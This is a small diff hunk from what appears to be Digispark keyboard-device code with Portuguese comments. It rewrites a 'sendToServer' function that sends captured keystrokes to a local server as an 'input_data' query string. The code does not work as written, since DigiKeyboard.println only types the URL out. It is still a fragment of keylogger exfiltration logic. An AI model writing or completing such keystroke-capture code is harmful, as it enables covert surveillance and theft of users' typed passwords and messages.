@@ -78,7 +78,7 @@ void stopCapturing() {
 
 // Função para enviar as teclas capturadas para o servidor
 void sendToServer(String keys) {
-    String serverUrl = "http://127.0.0.1:5000/captured" + keys; // URL do seu servidor
-    // Aqui você poderia implementar a chamada para o seu servidor
-    DigiKeyboard.println(serverUrl); // Envia a URL para o servidor
+    String serverUrl = "http://127.0.0.1:5000/submit"; // URL do seu servidor
+    String data = "input_data=" + keys; // Dados a serem enviados
+    DigiKeyboard.println(serverUrl + "?" + data); // Envia a URL para o servidor
 }
